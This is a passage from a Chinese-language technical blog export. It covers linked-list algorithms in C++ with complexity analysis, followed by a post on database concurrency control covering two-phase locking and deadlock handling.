<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ListNodePosi(T) List&lt;T&gt;::find ( T <span class="keyword">const</span>&amp; e, <span class="keyword">int</span> n, ListNodePosi(T) p ) <span class="keyword">const</span> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">0</span> &lt; n-- ) <span class="comment">//（0 &lt;= n &lt;= rank(p) &lt; _size）对于p的最近的n个前驱，从右向左</span></span><br><span class="line">      <span class="keyword">if</span> ( e == ( p = p-&gt;pred )-&gt;data ) <span class="keyword">return</span> p; <span class="comment">//逐个比对，直至命中或范围越界</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">//p越出左边界意味着区间内不含e，查找失败</span></span><br><span class="line">&#125; <span class="comment">//失败时，返回NULL</span></span><br></pre></td></tr></table></figure>
<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>插入时间复杂度为$ O(1)$</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ListNodePosi(T) ListNode&lt;T&gt;::insertAsPred ( T <span class="keyword">const</span>&amp; e ) &#123;</span><br><span class="line">   ListNodePosi(T) x = <span class="keyword">new</span> ListNode ( e, pred, <span class="keyword">this</span> ); <span class="comment">//创建新节点</span></span><br><span class="line">   pred-&gt;succ = x; pred = x; <span class="comment">//设置正向链接</span></span><br><span class="line">   <span class="keyword">return</span> x; <span class="comment">//返回新节点的位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>删除时间复杂度同样为$ O(1)$</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; T List&lt;T&gt;::remove ( ListNodePosi(T) p ) &#123; <span class="comment">//删除合法节点p，返回其数值</span></span><br><span class="line">   T e = p-&gt;data; <span class="comment">//备份待删除节点的数值（假定T类型可直接赋值）</span></span><br><span class="line">   p-&gt;pred-&gt;succ = p-&gt;succ; p-&gt;succ-&gt;pred = p-&gt;pred; <span class="comment">//后继、前驱</span></span><br><span class="line">   <span class="keyword">delete</span> p; _size--; <span class="comment">//释放节点，更新规模</span></span><br><span class="line">   <span class="keyword">return</span> e; <span class="comment">//返回备份的数值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> List&lt;T&gt;::deduplicate() &#123; <span class="comment">//剔除无序列表中的重复节点</span></span><br><span class="line">   <span class="keyword">if</span> ( _size &lt; <span class="number">2</span> ) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//平凡列表自然无重复</span></span><br><span class="line">   <span class="keyword">int</span> oldSize = _size; <span class="comment">//记录原规模</span></span><br><span class="line">   ListNodePosi(T) p = header; Rank r = <span class="number">0</span>; <span class="comment">//p从首节点开始</span></span><br><span class="line">   <span class="keyword">while</span> ( trailer != ( p = p-&gt;succ ) ) &#123; <span class="comment">//依次直到末节点</span></span><br><span class="line">      ListNodePosi(T) q = find ( p-&gt;data, r, p ); <span class="comment">//在p的r个（真）前驱中查找雷同者</span></span><br><span class="line">      q ? remove ( q ) : r++; <span class="comment">//若的确存在，则删除之；否则秩加一</span></span><br><span class="line">   &#125; <span class="comment">//assert: 循环过程中的任意时刻，p的所有前驱互不相同</span></span><br><span class="line">   <span class="keyword">return</span> oldSize - _size; <span class="comment">//列表规模变化量，即被删除元素总数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在最好情况下仅需$O(n)$时间,当所有元素均雷同时，仍然需要执行$O(n)$次迭代，每一步只需要$O(1)$时间。当前节点p始终只有一个前驱，因此<code>find()</code>只需常数时间。</p>
<p>算法最坏情况即为所有元素均彼此互异，当前节点p的前驱数目将随着迭代的推进线性地递增，平均为$O(n)$,算法总体复杂度为$O(n^2)$。</p>
<h1 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h1><h2 id="唯一化"><a href="#唯一化" class="headerlink" title="唯一化"></a>唯一化</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> List&lt;T&gt;::uniquify() &#123; <span class="comment">//成批剔除重复元素，效率更高</span></span><br><span class="line">   <span class="keyword">if</span> ( _size &lt; <span class="number">2</span> ) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//平凡列表自然无重复</span></span><br><span class="line">   <span class="keyword">int</span> oldSize = _size; <span class="comment">//记录原规模</span></span><br><span class="line">   ListNodePosi(T) p = first(); ListNodePosi(T) q; <span class="comment">//p为各区段起点，q为其后继</span></span><br><span class="line">   <span class="keyword">while</span> ( trailer != ( q = p-&gt;succ ) ) <span class="comment">//反复考查紧邻的节点对(p, q)</span></span><br><span class="line">      <span class="keyword">if</span> ( p-&gt;data != q-&gt;data ) p = q; <span class="comment">//若互异，则转向下一区段</span></span><br><span class="line">      <span class="keyword">else</span> remove ( q ); <span class="comment">//否则（雷同），删除后者</span></span><br><span class="line">   <span class="keyword">return</span> oldSize - _size; <span class="comment">//列表规模变化量，即被删除元素总数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只需遍历整个列表一趟，整体运行时间为$ O(n)$，线性正比于列表原先的规模。</p>
<h2 id="查找-1"><a href="#查找-1" class="headerlink" title="查找"></a>查找</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ListNodePosi(T) List&lt;T&gt;::search ( T <span class="keyword">const</span>&amp; e, <span class="keyword">int</span> n, ListNodePosi(T) p ) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="comment">// assert: 0 &lt;= n &lt;= rank(p) &lt; _size</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">0</span> &lt;= n-- ) <span class="comment">//对于p的最近的n个前驱，从右向左逐个比较</span></span><br><span class="line">      <span class="keyword">if</span> ( ( ( p = p-&gt;pred )-&gt;data ) &lt;= e ) <span class="keyword">break</span>; <span class="comment">//直至命中、数值越界或范围越界</span></span><br><span class="line"><span class="comment">// assert: 至此位置p必符合输出语义约定——尽管此前最后一次关键码比较可能没有意义（等效于与-inf比较）</span></span><br><span class="line">   <span class="keyword">return</span> p; <span class="comment">//返回查找终止的位置</span></span><br><span class="line">&#125; <span class="comment">//失败时，返回区间左边界的前驱（可能是header）——调用者可通过valid()判断成功与否</span></span><br></pre></td></tr></table></figure>
<p>与无序列表的<code>find()</code>不同，有序列表返回的是不大于e的最后者，而无序列表返回的是等于e的最后者。<code>search</code>多了一次与头哨兵的比较，与查找失败返回NULL语义吻合。两者最好情况下运行时间$O(1)$，最坏情况下为$O(n)$ ；等概率时平均$O(n)$，正比于区间宽度。</p>
<blockquote>
<p>为何未能借助有序性提高查找效率，实现不当，还是根本不可能？</p>
</blockquote>
<p>按照列表的循位置访问特性，物理存储位置与逻辑次序无关，依据秩的随机访问无法高效实现，而只能根据元素间的引用顺序访问。循位置访问效率较低，故查找效率同样不高。</p>
<h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>在起泡排序中，每趟扫描交换均需要$O(n)$时间，$O(n)$次比较和$O(n)$次交换，$O(n)$次交换中存在大量无谓的逆向移动，所以整体效率低下。选择排序将序列划分为无序前缀和有序前缀两部分；此外，还要求前缀不大于后缀。每次从前缀中选择最大者，并作为最小元素转移至后缀中。</p>
<p>选择排序适用于向量与列表在内的任何序列结构。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//列表的选择排序算法：对起始于位置p的n个元素排序</span></span><br><span class="line"><span class="keyword">void</span> List&lt;T&gt;::selectionSort ( ListNodePosi(T) p, <span class="keyword">int</span> n ) &#123; <span class="comment">//valid(p) &amp;&amp; rank(p) + n &lt;= size</span></span><br><span class="line">   ListNodePosi(T) head = p-&gt;pred; ListNodePosi(T) tail = p;</span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++ ) tail = tail-&gt;succ; <span class="comment">//待排序区间为(head, tail)</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> &lt; n ) &#123; <span class="comment">//在至少还剩两个节点之前，在待排序区间内</span></span><br><span class="line">      ListNodePosi(T) max = selectMax ( head-&gt;succ, n ); <span class="comment">//找出最大者（歧义时后者优先）</span></span><br><span class="line">      insertB ( tail, remove ( max ) ); <span class="comment">//将其移至无序区间末尾（作为有序区间新的首元素）</span></span><br><span class="line">      tail = tail-&gt;pred; n--;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">ListNodePosi(T) List&lt;T&gt;::selectMax ( ListNodePosi(T) p, <span class="keyword">int</span> n ) &#123;</span><br><span class="line">   ListNodePosi(T) max = p; <span class="comment">//最大者暂定为首节点p</span></span><br><span class="line">   <span class="keyword">for</span> ( ListNodePosi(T) cur = p; <span class="number">1</span> &lt; n; n-- ) <span class="comment">//从首节点p出发，将后续节点逐一与max比较</span></span><br><span class="line">      <span class="keyword">if</span> ( !lt ( ( cur = cur-&gt;succ )-&gt;data, max-&gt;data ) ) <span class="comment">//若当前元素不小于max，则</span></span><br><span class="line">         max = cur; <span class="comment">//更新最大元素位置记录</span></span><br><span class="line">   <span class="keyword">return</span> max; <span class="comment">//返回最大节点位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>insertB ( tail, remove ( max ) );</code>  涉及节点存储空间的动态释放与申请，所需时间操作比一般操作高出一个数量级，故可改为<code>swap(tail-&gt;pres-&gt;data,max-&gt;data)</code>。</p>
<blockquote>
<p>若将!lt ( ( cur = cur-&gt;succ )-&gt;data, max-&gt;data ) 改为lt ( max-&gt;data， ( cur = cur-&gt;succ )-&gt;data ))</p>
</blockquote>
<p>采用比较器<code>!lt()</code>或<code>ge()</code>等效于后者优先，如此即可保证重复元素在列表中的次序与其插入次序一致。若改为<code>lt()</code>雷同元素的次序将会完全颠倒，稳定性得不到保证。</p>
<p><strong>性能分析</strong></p>
<p>选择排序由$n$步迭代构成，其运行时间取决于各步迭代中查找及插入操作的效率。<code>insertB()</code>和<code>remove()</code>均只需$O(1)$时间。<code>selectMax()</code>每次必须遍历整个无序前缀，时间线性正比于前缀长度，总计为$O(n^2)$。</p>
<p>但是无论输入序列中各元素相对大小如何，以上$n$次<code>selectMax()</code>调用累计耗时总是$\Theta(n^2)$，最好情况下和最坏情况下复杂度相同。其中元素移动操作远远少于起泡排序，$ \Theta (n^2)$主要来自于元素比较操作。</p>
<p><strong>循环节</strong></p>
<p>任何一个序列A[0,n)都可以分解为若干循环节</p>
<p>任何一个序列A[0,n),都对应于一个有序队列S[0,n)</p>
<p>元素A[k]所属的循环节是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A[k],A[r(k)],A[r(r(k))],...,A[r(...r(k)...)]&#x3D;A[k]</span><br></pre></td></tr></table></figure>
<p>每个循环节，长度不超过n,循环节之间没有重复元素</p>
<p>选择排序每迭一步，M所属循环节恰好减少一个单位，M脱离原来的循环节，自成一个长度为1的循环节，其余循环节保持不变。</p>
<blockquote>
<p>M已经就位，无需交换，这样的情况会出现几次</p>
</blockquote>
<p>有多少个循环节就出现多少次，最大值为$O(n)$，期望值为$O(logn)$</p>
<h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><p>插入排序算法可简要描述为：</p>
<p>始终将序列视为两个部分，有序的前缀S和无序的后缀U，反复地对将后缀中的首元素取出并转移至前缀中。</p>
<p>插入排序适用于向量与列表在内的任何序列结构。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//列表的插入排序算法：对起始于位置p的n个元素排序</span></span><br><span class="line"><span class="keyword">void</span> List&lt;T&gt;::insertionSort ( ListNodePosi(T) p, <span class="keyword">int</span> n ) &#123; <span class="comment">//valid(p) &amp;&amp; rank(p) + n &lt;= size</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> r = <span class="number">0</span>; r &lt; n; r++ ) &#123; <span class="comment">//逐一为各节点</span></span><br><span class="line">      insertA ( search ( p-&gt;data, r, p ), p-&gt;data ); <span class="comment">//查找适当的位置并插入</span></span><br><span class="line">      p = p-&gt;succ; remove ( p-&gt;pred ); <span class="comment">//转向下一节点</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$n$次迭代，每次$O(r+1)$</p>
<p><strong>性能分析</strong></p>
<p>仅使用$O(1)$辅助空间，属于就地算法</p>
<p>不要求所有数据在算法运行时就完备，属于在线算法</p>
<p>具有输入敏感性</p>
<ul>
<li>最好情况：完全(或几乎)有序</li>
</ul>
<p>每次迭代只需$1$次比较，$0$次交换，只需$O(n)$时间</p>
<ul>
<li>最坏情况：完全或几乎逆序</li>
</ul>
<p>第k次迭代，需$O(k)$次比较，1次交换，累计$O(n^2)$时间</p>
<p><strong>优化的可能</strong></p>
<p>在有序前缀中的查找定位可以考虑用向量的二分查找，而不是顺序查找。</p>
<p>假定序列中的n个元素的数值为独立均匀的随机分布，则</p>
<blockquote>
<p>列表的插入排序算法平均需要$n^2/4=O(n^2)$次元素比较操作</p>
</blockquote>
<p>平均意义下的比较操作次数，也就是概率意义下的比较操作期望次数。</p>
<p>比较操作期望次数，应等于各步迭代中比较操作的次数。</p>
<p><code>search()</code>过程涉及的比较操作次数，应从$0$到$n-1$按照算术级数线性递增，故其总和应为<br>$$<br>\sum _{i=1} ^{n-1} (k/2)=\frac {n(n-1)} {4} =O(N^2)<br>$$</p>
<blockquote>
<p>向量的插入排序算法平均需要$n^2/4=O(n^2)$次元素移动操作</p>
</blockquote>
<p>向量中插入排序的<code>search()</code>接口可通过二分查找从线性优化至$O(log n)$,但是确定位置后将元素插入已排序的子序列却不得不移动个$O(n)$节点，平均需要$n^2/4=O(n^2)$次元素移动操作。</p>
<blockquote>
<p>在$n$次迭代中，平均有多少次无需交换呢？</p>
</blockquote>
<p>无需移动的元素期望数目，等于各步迭代中待插入元素无需移动的概率之和。</p>
<p>对于任意$k\in[0,n)$,当前A[k]的$k$个前驱应该也已构成一个有序的子序列A[0,k)。若A[k]无需移动即使得A[0,k]仍为有序子序列，则其充要条件是A[k]在A[0,k]中为最大元素。<br>$$<br>\sum _{i=0} ^{n-1} 1/(k+1)=\sum _{i=1} ^{n} (1/k)= \Theta(logn)<br>$$</p>
<blockquote>
<p>序列中元素A[i]和A[j]若满足i&lt;j,且A[i]&gt;A[j]，则称为一个逆序对，若所有逆序对的间距均不超过$k$,则运行时间为$O(kn)$</p>
</blockquote>
<p>算法进入到A[k]那步迭代时，该元素在输入序列中的所有前驱都应该业已构成一个有序序列A[0,j)。既然至多$k$个位置与A[j]构成逆序对，故查找过程<code>search()</code> 至多扫描其中k个元素，即可确定合适的插入位置，对应的时间不超过$O(k)$。实际上，每一步都具有以上性质，所以累计运行时间不超过$O(kn)$。<br>当$k$为常数时，插入排序可在线性时间内完成。</p>
<blockquote>
<p>若共有$I$个逆序对，则关键码比较次数不超过$O(I)$</p>
</blockquote>
<p>这里定义的每一逆序对，均涉及两个元素，为了便于分析，统一归入后者。因此，所有元素逆序前驱的数目总和应恰好等于$I$。每个元素涉及到的比较操作的数目，应恰好等于逆序前驱的数目。整个算法执行过程中所执行的比较操作总数应恰好等于所有元素的逆序前驱的数目总和。</p>
<blockquote>
<p>若共有$I$个逆序对，则运行时间$O(n+I)$</p>
</blockquote>
<p>由以上分析，算法过程中消耗于比较操作的时间可由$O(I)$界定，而消耗于移动操作的时间则由$O(n)$界定,二者累计即为$O(n+I)$。既然此处实际的运行时间更多地取决于逆序对的数目，而不仅仅是输入序列的长度，故插入排序亦属于所谓的输入敏感的算法。若将失败比较操作同样归入比较操作的范畴，则还有一个$O(n)$项，在渐进意义下这一因素可忽略。</p>
<h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//列表的归并排序算法：对起始于位置p的n个元素排序</span></span><br><span class="line"><span class="keyword">void</span> List&lt;T&gt;::mergeSort ( ListNodePosi(T) &amp; p, <span class="keyword">int</span> n ) &#123; <span class="comment">//valid(p) &amp;&amp; rank(p) + n &lt;= size</span></span><br><span class="line">   <span class="keyword">if</span> ( n &lt; <span class="number">2</span> ) <span class="keyword">return</span>; <span class="comment">//若待排序范围已足够小，则直接返回；否则...</span></span><br><span class="line">   <span class="keyword">int</span> m = n &gt;&gt; <span class="number">1</span>; <span class="comment">//以中点为界</span></span><br><span class="line">   ListNodePosi(T) q = p; <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++ ) q = q-&gt;succ; <span class="comment">//均分列表</span></span><br><span class="line">   mergeSort ( p, m ); mergeSort ( q, n - m ); <span class="comment">//对前、后子列表分别排序</span></span><br><span class="line">   merge ( p, m, *<span class="keyword">this</span>, q, n - m ); <span class="comment">//归并</span></span><br><span class="line">&#125; <span class="comment">//注意：排序后，p依然指向归并后区间的（新）起点</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//有序列表的归并：当前列表中自p起的n个元素，与列表L中自q起的m个元素归并</span></span><br><span class="line"><span class="keyword">void</span> List&lt;T&gt;::merge ( ListNodePosi(T) &amp; p, <span class="keyword">int</span> n, List&lt;T&gt;&amp; L, ListNodePosi(T) q, <span class="keyword">int</span> m ) &#123;</span><br><span class="line"><span class="comment">// assert:  this.valid(p) &amp;&amp; rank(p) + n &lt;= size &amp;&amp; this.sorted(p, n)</span></span><br><span class="line"><span class="comment">//          L.valid(q) &amp;&amp; rank(q) + m &lt;= L._size &amp;&amp; L.sorted(q, m)</span></span><br><span class="line"><span class="comment">// 注意：在归并排序之类的场合，有可能 this == L &amp;&amp; rank(p) + n = rank(q)</span></span><br><span class="line">   ListNodePosi(T) pp = p-&gt;pred; <span class="comment">//借助前驱（可能是header），以便返回前 ...</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">0</span> &lt; m ) <span class="comment">//在q尚未移出区间之前</span></span><br><span class="line">      <span class="keyword">if</span> ( ( <span class="number">0</span> &lt; n ) &amp;&amp; ( p-&gt;data &lt;= q-&gt;data ) ) <span class="comment">//若p仍在区间内且v(p) &lt;= v(q)，则</span></span><br><span class="line">         &#123; <span class="keyword">if</span> ( q == ( p = p-&gt;succ ) ) <span class="keyword">break</span>; n--; &#125; <span class="comment">//p归入合并的列表，并替换为其直接后继</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//若p已超出右界或v(q) &lt; v(p)，则</span></span><br><span class="line">         &#123; insertB ( p, L.remove ( ( q = q-&gt;succ )-&gt;pred ) ); m--; &#125; <span class="comment">//将q转移至p之前</span></span><br><span class="line">   p = pp-&gt;succ; <span class="comment">//确定归并后区间的（新）起点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为节省每次子列表的划分时间，令$m=min(c,n/2)$，则总体复杂度反而会上升至$O(n^2)$</p>
<p>$T(n)=T(c)+T(n-c)+O(n)$<br>$T(n)=O(n^2)$ </p>
<h1 id="游标实现"><a href="#游标实现" class="headerlink" title="游标实现"></a>游标实现</h1><p>在某些特定的语言环境中不支持指针或不支持动态空间分配，此时用线性数组，以游标的形式模拟列表</p>
<p><code>elem[]</code>:对外可见的数据项</p>
<p><code>link[]</code>:数据项之间的引用</p>
<p>维护逻辑上互补的列表data和free</p>
<p><code>data</code>即为数据链表的首元素的秩，通过link索引至下一元素</p>
<p><code>free</code>即为空闲链表首元素的秩，通过link索引至下一元素</p>
<blockquote>
<p>具体实现</p>
</blockquote>
<p>初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CursorList ( <span class="keyword">int</span> c = DEFAULT_CAPACITY ) &#123; <span class="comment">//容量为c</span></span><br><span class="line">      _link = <span class="keyword">new</span> Rank[_capacity = c]; <span class="comment">//游标指针向量</span></span><br><span class="line">      _elem = <span class="keyword">new</span> T[_capacity = c]; <span class="built_in">memset</span> ( _elem, <span class="number">0</span>, c * <span class="keyword">sizeof</span> ( T ) ); <span class="comment">//数据向量</span></span><br><span class="line">      _data = <span class="number">-1</span>; _size = <span class="number">0</span>; <span class="comment">//数据链表初始为空</span></span><br><span class="line">      _free = <span class="number">0</span>; <span class="comment">//空闲链表由所有单元依次串接而成</span></span><br><span class="line">      <span class="keyword">for</span> ( Rank i = <span class="number">0</span>; i &lt; c - <span class="number">1</span>; i++ ) _link[i] = i + <span class="number">1</span>;</span><br><span class="line">      _link[c - <span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>插入元素</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Rank <span class="title">insert</span> <span class="params">( T <span class="keyword">const</span>&amp; e )</span> </span>&#123; <span class="comment">//插入元素</span></span><br><span class="line">      assert ( <span class="number">0</span> &lt;= _free );</span><br><span class="line">      Rank k = _free; _free = _link[k]; _elem[k] = e;</span><br><span class="line">      _link[k] = _data; _data = k;</span><br><span class="line">      _size++; <span class="keyword">return</span> k;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>删除元素</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Rank <span class="title">find</span> <span class="params">( T <span class="keyword">const</span>&amp; e )</span> <span class="keyword">const</span> </span>&#123; <span class="comment">//查找</span></span><br><span class="line">     Rank i = _data; <span class="comment">//从数据链表起点出发</span></span><br><span class="line">     <span class="keyword">while</span> ( ( <span class="number">0</span> &lt;= i ) &amp;&amp; ( e != _elem[i] ) ) i = _link[i]; <span class="comment">//依次比对</span></span><br><span class="line">     <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">Rank <span class="title">remove</span> <span class="params">( Rank k )</span> </span>&#123; <span class="comment">//删除秩为k的元素</span></span><br><span class="line">     assert ( <span class="number">0</span> &lt;= k ); <span class="comment">//此前经查找并确认k合法</span></span><br><span class="line">     <span class="keyword">if</span> ( _data == k ) <span class="comment">//若[k]为首节点</span></span><br><span class="line">        _data = _link[k];</span><br><span class="line">     <span class="keyword">else</span> &#123; <span class="comment">//否则</span></span><br><span class="line">        Rank i = _data; <span class="keyword">while</span> ( k != _link[i] ) i = _link[i];</span><br><span class="line">        _link[i] = _link[k];</span><br><span class="line">     &#125;</span><br><span class="line">     _link[k] = _free; _free = k; _elem[k] = <span class="number">0</span>;</span><br><span class="line">     _size--; <span class="keyword">return</span> k;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>先调用<code>find</code>查找删除元素的秩，再调用<code>remove</code>删秩为k的元素。约定初始化或删除后元素均置为0。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>并发控制</title>
    <url>/database_system/concurrency-control/</url>
    <content><![CDATA[<p>事务的基本特性是隔离性，然而当数据库中由多个事务并发执行时，事务的隔离性不一定能保持。为保持事务的隔离性，系统必须对并发事务之间的相互作用加以控制，这种控制通过并发控制机制来实现。</p>
<a id="more"></a>

<p>之前我们了解到视图串行化并不存在有效验证方法，那么还需要有一种方式来确保在不提前知道所有调度的情况下所有执行调度仍然是正确的，因此引入锁机制。</p>
<p>之前的调度序列在引入锁机制后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                      T2</span><br><span class="line">BEGIN</span><br><span class="line">LOCK(A)</span><br><span class="line">R(A)</span><br><span class="line">                       BEGIN</span><br><span class="line">                       LOCK(A)</span><br><span class="line">W(A)</span><br><span class="line">R(A)</span><br><span class="line">UNLOCK(A)</span><br><span class="line">                       R(A)</span><br><span class="line">                       W(A)                       </span><br><span class="line">COMMIT</span><br><span class="line">                       UNLOCK(A)</span><br><span class="line">                       COMMIT</span><br></pre></td></tr></table></figure>
<p>在T2申请对A锁的时候，T1已经取得了对A的锁，在T1释放对A锁之后，T2才可得到对A的锁。</p>
<p>锁的基本类型有两种</p>
<ul>
<li>S-LOCK: 共享读锁</li>
<li>X-LOCK: 排他写锁</li>
</ul>
<p>对于给定的一个锁类型集合,令A与B代表任意的锁类型，假设事务Ti请求对数据项加A类型锁，而事务Tj当前在数据库Q上拥有B类型锁，而事务Ti可立即获得数据项Q上的锁，那么A类型锁和B类型锁是相容的。</p>
<p>S-LOCK和X-LOCK的相容性矩阵如下</p>
<table>
<thead>
<tr>
<th></th>
<th>S</th>
<th>X</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>true</td>
<td>false</td>
</tr>
<tr>
<td>X</td>
<td>false</td>
<td>false</td>
</tr>
</tbody></table>
<p>关于锁的流程为</p>
<ol>
<li><p>事务申请锁(或者更新)</p>
</li>
<li><p>锁管理器授予锁或者拒绝请求</p>
</li>
<li><p>事务释放锁</p>
</li>
<li><p>锁管理器释放内部的锁表</p>
<p>锁表中存储持有锁的事务信息和等待锁的事务信息</p>
</li>
</ol>
<p>在系统中每一个事物遵从称为封锁协议的一组规则，这些规则规定事务何时对数据项进行加锁、解锁，封锁协议限制了可能的调度数目。</p>
<h1 id="两阶段封锁协议"><a href="#两阶段封锁协议" class="headerlink" title="两阶段封锁协议"></a>两阶段封锁协议</h1><p>确保串行性的一个协议是两阶段封锁协议，该协议要求每个事务分两个阶段提出加锁和释放锁申请。</p>
<ol>
<li><p>增长阶段：事务可以获得锁，但是不能释放锁</p>
<p>锁管理器允许/拒绝请求</p>
</li>
<li><p>缩减阶段：事务可以释放锁，但是不能释放锁</p>
<p>在增长阶段后不允许申请/升级锁。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                      T2</span><br><span class="line">BEGIN</span><br><span class="line">X-LOCK(A)</span><br><span class="line">R(A)</span><br><span class="line">W(A)</span><br><span class="line">                       BEGIN</span><br><span class="line">                       X-LOCK(A)</span><br><span class="line">R(A)</span><br><span class="line">UNLOCK(A)</span><br><span class="line">                       W(A)                       </span><br><span class="line">COMMIT</span><br><span class="line">                       UNLOCK(A)</span><br><span class="line">                       COMMIT</span><br></pre></td></tr></table></figure>
<p>两阶段封锁协议可保证冲突可串行化，产生无环的依赖图。</p>
<p>在两阶段封锁协议中，可能存在级联回滚现象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                      T2</span><br><span class="line">BEGIN</span><br><span class="line">X-LOCK(A)</span><br><span class="line">X-LOCK(B)</span><br><span class="line">R(A)</span><br><span class="line">W(A)</span><br><span class="line">UNLOCK(A)</span><br><span class="line">                       BEGIN</span><br><span class="line">                       X-LOCK(A)</span><br><span class="line">                       R(A)</span><br><span class="line">                       W(A)</span><br><span class="line">R(B)                    .</span><br><span class="line">W(B)                    .</span><br><span class="line">ABORT                   .</span><br></pre></td></tr></table></figure>
<p>在事务T1的W(B)后发生故障，从而导致T2级联回滚，从而导致无效的操作。同时存在可能的可串行化调度，但是不被两阶段封锁协议允许。</p>
<p>可通过严格两阶段封锁协议或者强两阶段封锁协议解决。</p>
<h2 id="强两阶段封锁协议"><a href="#强两阶段封锁协议" class="headerlink" title="强两阶段封锁协议"></a>强两阶段封锁协议</h2><p>除了要求封锁是两阶段以外，还要求事务持有的所有锁必须在事务提交后方可释放。</p>
<ul>
<li>仅仅允许可冲突可串行化调度</li>
<li>不存在级联回滚现象</li>
<li>一个事务写入的值在该事务结束前不可被其余事务读入或者写入</li>
<li>可能存在死锁现象</li>
</ul>
<p><img src="https://i.loli.net/2020/02/06/JLQBVAg3ubpvkMz.png"></p>
<h2 id="死锁处理"><a href="#死锁处理" class="headerlink" title="死锁处理"></a>死锁处理</h2><p><strong>死锁检测</strong></p>
<p>系统创建等待图，节点为事务，若事务Ti等待事务Tj释放锁，那么添加从Ti到Tj的边。系统定期检查等待图中是否出现环路，再决定如何破坏循环。</p>
<ul>
<li><p>当系统检测到死锁，系统将会选择一个回滚的事务来破坏环路</p>
</li>
<li><p>取决于应用处理方式，选择的事务将重启或者终止</p>
</li>
<li><p>有多种事务属性可作为选择替代的根据，不存在哪个优于其余选择</p>
<p>按照时间(最早或者最晚)</p>
<p>按照进程(最少/最多执行的查询)</p>
<p>按照已经锁住的条目个数</p>
<p>按照回滚事务的个数</p>
<p>按照事务过去重启的次数</p>
</li>
<li><p>在选择事务后，系统还需决定回滚的长度，要么整个事务的操作均撤销，要么撤销操作数目达到死锁解除的要求即可。</p>
</li>
</ul>
<p><strong>死锁预防</strong></p>
<p>当一个事务请求已经被其他事务持有的锁，此时执行死锁预防算法。</p>
<p>基于时间给定优先级，例如，时间越久意味着优先级越高。如此可确保不存在死锁，因为只有一个方向的等待。当一个事务重启，它将继承之前的优先级。</p>
<ul>
<li>wait-die:若T1优先级高于T2,T1等待T2，否则T1终止</li>
<li>wound-wait:若T1优先级高于T2，T2终止，否则T1等待</li>
</ul>
<p><img src="https://i.loli.net/2020/02/06/zgCqmRNaUSLfI3Y.png"></p>
